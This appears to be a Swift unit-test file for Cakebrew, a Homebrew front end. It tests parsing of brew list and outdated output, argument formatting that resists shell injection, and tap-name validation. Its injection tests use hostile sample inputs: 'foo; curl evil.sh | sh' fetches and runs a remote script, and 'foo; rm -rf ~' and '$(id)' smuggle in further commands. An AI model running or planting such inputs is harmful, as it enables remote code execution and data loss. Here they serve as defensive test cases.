//
//  BPHomebrewInterfaceListCallTests.swift
//  CakebrewTests
//
//  Characterization tests for the private list-call parsers that turn raw
//  `brew list --versions` / `brew outdated --verbose` output into BPFormula
//  objects. The classes live in BPFormulaInformationState.swift (compiled into
//  this test target).
//

import XCTest

final class BPHomebrewInterfaceListCallTests: XCTestCase, @unchecked Sendable {

    // MARK: - parseData (base)

    func testParseDataDropsTrailingNewlineElement() {
        // brew output is newline-terminated; the final empty element must be dropped.
        let call = BPHomebrewInterfaceListCall(arguments: [])
        let result = call.parseData("alpha\nbeta\ngamma\n")

        XCTAssertEqual(result.count, 3, "trailing empty line should be dropped")
        XCTAssertEqual(result.first?.name, "alpha")
        XCTAssertEqual(result.last?.name, "gamma")
    }

    func testParseDataEmptyInputYieldsNoFormulae() {
        let call = BPHomebrewInterfaceListCall(arguments: [])
        let result = call.parseData("")

        XCTAssertEqual(result.count, 0)
    }

    // MARK: - installed parser (`list --versions`)

    func testInstalledParserSplitsNameAndVersion() {
        let call = BPHomebrewInterfaceListCallInstalled()
        let formula = call.parseFormulaItem("ffmpeg 2.7.2")

        XCTAssertEqual(formula?.name, "ffmpeg")
        XCTAssertEqual(formula?.version, "2.7.2")
    }

    func testInstalledParserUsesLastOfMultipleInstalledVersions() {
        let call = BPHomebrewInterfaceListCallInstalled()
        let formula = call.parseFormulaItem("python 3.9 3.10")

        XCTAssertEqual(formula?.name, "python")
        XCTAssertEqual(formula?.version, "3.10", "last token is the most recent installed version")
    }

    func testInstalledParserKeepsTapQualifiedNameWithShortInstalledName() {
        let call = BPHomebrewInterfaceListCallInstalled()
        let formula = call.parseFormulaItem("homebrew/dupes/zlib 1.2.8")

        XCTAssertEqual(formula?.name, "homebrew/dupes/zlib", "the full tap-qualified name is preserved")
        XCTAssertEqual(formula?.installedName(), "zlib", "installedName strips the tap prefix")
        XCTAssertEqual(formula?.version, "1.2.8")
    }

    func testInstalledParserParsesMultiLineDataThroughSubclass() {
        // parseData on the base class must dispatch to the subclass parseFormulaItem.
        let call = BPHomebrewInterfaceListCallInstalled()
        let formulae = call.parseData("ffmpeg 2.7.2\npython 3.10\n")

        XCTAssertEqual(formulae.count, 2)
        XCTAssertEqual(formulae[0].name, "ffmpeg")
        XCTAssertEqual(formulae[0].version, "2.7.2")
        XCTAssertEqual(formulae[1].name, "python")
        XCTAssertEqual(formulae[1].version, "3.10")
    }

    // MARK: - upgradeable parser (`outdated --verbose`)

    func testUpgradeableParserSingleVersion() {
        let call = BPHomebrewInterfaceListCallUpgradeable()
        let formula = call.parseFormulaItem("ffmpeg (2.7.1) < 2.7.2")

        XCTAssertEqual(formula?.name, "ffmpeg")
        XCTAssertEqual(formula?.version, "2.7.1")
        XCTAssertEqual(formula?.latestVersion, "2.7.2")
    }

    func testUpgradeableParserMultipleInstalledVersionsUsesLast() {
        let call = BPHomebrewInterfaceListCallUpgradeable()
        let formula = call.parseFormulaItem("foo (1.0, 1.1) < 2.0")

        XCTAssertEqual(formula?.name, "foo")
        XCTAssertEqual(formula?.version, "1.1", "the last of the installed versions is reported")
        XCTAssertEqual(formula?.latestVersion, "2.0")
    }

    func testUpgradeableParserNonMatchingLineFallsBackToName() {
        let call = BPHomebrewInterfaceListCallUpgradeable()
        let formula = call.parseFormulaItem("justaname")

        XCTAssertEqual(formula?.name, "justaname")
        XCTAssertNil(formula?.latestVersion)
    }

    // MARK: - pinned parser (`list --pinned`)

    func testPinnedCallUsesListPinnedArguments() {
        let call = BPHomebrewInterfaceListCallPinned()
        XCTAssertEqual(call.arguments as? [String], ["list", "--formula", "--pinned"])
    }

    func testPinnedParserReturnsNameOnlyFormulae() {
        // `brew list --pinned` prints one formula name per line, no versions.
        let call = BPHomebrewInterfaceListCallPinned()
        let formulae = call.parseData("git\nwget\n")

        XCTAssertEqual(formulae.count, 2)
        XCTAssertEqual(formulae[0].name, "git")
        XCTAssertNil(formulae[0].version, "pinned list is name-only")
        XCTAssertEqual(formulae[1].name, "wget")
    }

    // MARK: - installed casks parser (`list --cask --versions`)

    func testInstalledCasksCallUsesListCaskVersionsArguments() {
        let call = BPHomebrewInterfaceListCallInstalledCasks()
        XCTAssertEqual(call.arguments as? [String], ["list", "--cask", "--versions"])
    }

    func testInstalledCasksParserSplitsTokenAndVersion() {
        // `brew list --cask --versions` prints "token version", same shape as the
        // installed-formula list, so the parser is inherited.
        let call = BPHomebrewInterfaceListCallInstalledCasks()
        let cask = call.parseFormulaItem("google-chrome 120.0.6099.109")

        XCTAssertEqual(cask?.name, "google-chrome")
        XCTAssertEqual(cask?.version, "120.0.6099.109")
    }

    func testInstalledCasksParserKeepsCommaVersion() {
        // Cask versions can contain a comma (version,revision) but no spaces.
        let call = BPHomebrewInterfaceListCallInstalledCasks()
        let cask = call.parseFormulaItem("antigravity 2.2.1,5287492581195776")

        XCTAssertEqual(cask?.name, "antigravity")
        XCTAssertEqual(cask?.version, "2.2.1,5287492581195776")
    }

    func testInstalledCasksParserMarksResultAsCask() {
        // Operations dispatch on the cask flag (`brew uninstall --cask ...`), so
        // everything parsed from the cask list must carry it.
        let call = BPHomebrewInterfaceListCallInstalledCasks()
        let cask = call.parseFormulaItem("google-chrome 120.0.6099.109")

        XCTAssertEqual(cask?.cask, true)
    }

    func testInstalledFormulaeParserDoesNotMarkCask() {
        let call = BPHomebrewInterfaceListCallInstalled()
        let formula = call.parseFormulaItem("ffmpeg 2.7.2")

        XCTAssertEqual(formula?.cask, false)
    }

    // MARK: - outdated casks parser (`outdated --cask --verbose`)

    func testOutdatedCasksCallUsesOutdatedCaskVerboseArguments() {
        let call = BPHomebrewInterfaceListCallOutdatedCasks()
        XCTAssertEqual(call.arguments as? [String], ["outdated", "--cask", "--verbose"])
    }

    func testOutdatedCasksParserParsesNotEqualComparator() {
        // Cask lines use `!=` (cask versions aren't ordered), not the `<` that
        // formula lines use: "acorn (8.6) != 8.6.1".
        let call = BPHomebrewInterfaceListCallOutdatedCasks()
        let cask = call.parseFormulaItem("acorn (8.6) != 8.6.1")

        XCTAssertEqual(cask?.name, "acorn")
        XCTAssertEqual(cask?.version, "8.6")
        XCTAssertEqual(cask?.latestVersion, "8.6.1")
        XCTAssertEqual(cask?.cask, true, "outdated-cask results must carry the cask flag")
    }

    func testOutdatedCasksParserHandlesCommaVersions() {
        let call = BPHomebrewInterfaceListCallOutdatedCasks()
        let cask = call.parseFormulaItem("claude (1.14271.0,c8f4d811) != 1.20186.1,df1d8a33")

        XCTAssertEqual(cask?.name, "claude")
        XCTAssertEqual(cask?.version, "1.14271.0,c8f4d811")
        XCTAssertEqual(cask?.latestVersion, "1.20186.1,df1d8a33")
    }

    // MARK: - all casks parser (`brew casks`)

    func testAllCasksCallUsesCasksArguments() {
        let call = BPHomebrewInterfaceListCallAllCasks()
        XCTAssertEqual(call.arguments as? [String], ["casks"])
    }

    func testAllCasksParserReturnsNameOnlyCasks() {
        // `brew casks` prints one token per line, no versions.
        let call = BPHomebrewInterfaceListCallAllCasks()
        let casks = call.parseData("0-ad\n010-editor\nfirefox\n")

        XCTAssertEqual(casks.count, 3)
        XCTAssertEqual(casks[2].name, "firefox")
        XCTAssertNil(casks[2].version)
        XCTAssertTrue(casks[2].cask, "the all-casks list must mark results as casks")
    }

    func testUpgradeableParserStillParsesFormulaComparator() {
        // Generalizing the comparator for casks must not regress formula lines.
        let call = BPHomebrewInterfaceListCallUpgradeable()
        let formula = call.parseFormulaItem("ffmpeg (2.7.1) < 2.7.2")

        XCTAssertEqual(formula?.name, "ffmpeg")
        XCTAssertEqual(formula?.version, "2.7.1")
        XCTAssertEqual(formula?.latestVersion, "2.7.2")
        XCTAssertEqual(formula?.cask, false)
    }

    // MARK: - output-block nil safety (regression: pin/unpin pass a nil block)

    func testInvokeOutputBlockWithNilBlockIsSafeNoOp() {
        // pin/unpin call the brew command with a nil return block. The command path
        // invoked that block unconditionally, so a nil block was an EXC_BAD_ACCESS.
        // Reaching the assertion below (no crash) is the regression check.
        BPHomebrewInterface.sharedInterface().invokeOutputBlock(nil, withString: "anything")
        XCTAssertTrue(true, "invoking a nil output block must be a safe no-op")
    }

    func testInvokeOutputBlockDeliversStringToNonNilBlock() {
        var received: String?
        BPHomebrewInterface.sharedInterface().invokeOutputBlock({ string in
            received = string
        }, withString: "hello")

        XCTAssertEqual(received, "hello", "a non-nil block still receives the output")
    }

    // MARK: - formatArguments: (shell-injection safety)

    func testFormatArgumentsPassesArgsAsPositionalParameters() {
        // -l -c '<script>' <$0> <$1> ... — args live in argv, not the command string.
        let argv = (BPHomebrewInterface.sharedInterface().formatArguments(["tap", "user/repo"], sendOutputId: false) as? [String]) ?? []

        XCTAssertEqual(argv[0], "-l")
        XCTAssertEqual(argv[1], "-c")
        XCTAssertEqual(argv[2], "brew \"$@\"", "the command references $@, not interpolated args")
        XCTAssertEqual(argv[3], "brew", "$0 is a label")
        XCTAssertEqual(argv[4], "tap")
        XCTAssertEqual(argv[5], "user/repo")
    }

    func testFormatArgumentsKeepsShellMetacharactersInert() {
        let malicious = "foo; curl evil.sh | sh"
        let argv = (BPHomebrewInterface.sharedInterface().formatArguments(["tap", malicious], sendOutputId: false) as? [String]) ?? []

        // The injected payload must never reach the shell command string...
        XCTAssertFalse(argv[2].contains("curl"), "user input must not reach the command string")
        // ...and must survive as a single, unsplit argument.
        XCTAssertTrue(argv.contains(malicious), "the malicious string stays one argument")
    }

    func testFormatArgumentsWithOutputIdKeepsMarkerAndPositionalArgs() {
        let argv = (BPHomebrewInterface.sharedInterface().formatArguments(["list"], sendOutputId: true) as? [String]) ?? []

        XCTAssertTrue(argv[2].hasPrefix("echo "), "the output marker is still emitted")
        XCTAssertTrue(argv[2].hasSuffix("brew \"$@\""))
        XCTAssertEqual(argv.last, "list")
    }

    func testFormatArgumentsHandlesEmptyArguments() {
        let argv = (BPHomebrewInterface.sharedInterface().formatArguments([], sendOutputId: false) as? [String]) ?? []
        XCTAssertEqual(argv, ["-l", "-c", "brew \"$@\"", "brew"])
    }

    // MARK: - isValidTapName: (tap input validation)

    func testValidTapNamesAreAccepted() {
        for name in ["user/repo", "charmbracelet/tap", "homebrew/cask-fonts", "entireio/tap", "a.b/c.d"] {
            XCTAssertTrue(BPHomebrewInterface.isValidTapName(name), "'\(name)' should be a valid tap name")
        }
    }

    func testTapNameMustBeOwnerSlashRepo() {
        for name in ["", "foo", "foo/bar/baz", "foo/", "/bar", "foo//bar"] {
            XCTAssertFalse(BPHomebrewInterface.isValidTapName(name), "'\(name)' is not owner/repo")
        }
    }

    func testTapNameRejectsShellMetacharactersAndWhitespace() {
        for name in [
            "foo; rm -rf ~",
            "foo/bar&whoami",
            "foo /bar",
            "foo/bar baz",
            "$(id)/x",
            "foo/`id`",
            "foo|bar/x",
            "a\nb/c" /* interior newline */
        ] {
            XCTAssertFalse(BPHomebrewInterface.isValidTapName(name), "'\(name)' must be rejected")
        }
    }

    func testTapNameValidationTrimsSurroundingWhitespace() {
        // A user pasting "  user/repo  " should still be accepted (trimmed).
        XCTAssertTrue(BPHomebrewInterface.isValidTapName("  user/repo  "))
    }

    func testPinnedCaskQueryAndParserUseCaskNamespace() {
        let call = BPHomebrewInterfaceListCallPinnedCasks()
        XCTAssertEqual(call.arguments as? [String], ["list", "--cask", "--pinned"])
        let items = call.parseData("browser\n")
        XCTAssertEqual(items.first?.name, "browser")
        XCTAssertEqual(items.first?.cask, true)
    }

    func testOutdatedFormulaQueryUsesExplicitFormulaNamespace() {
        XCTAssertEqual(BPHomebrewInterfaceListCallUpgradeable().arguments as? [String], ["outdated", "--formula", "--verbose"])
    }
}
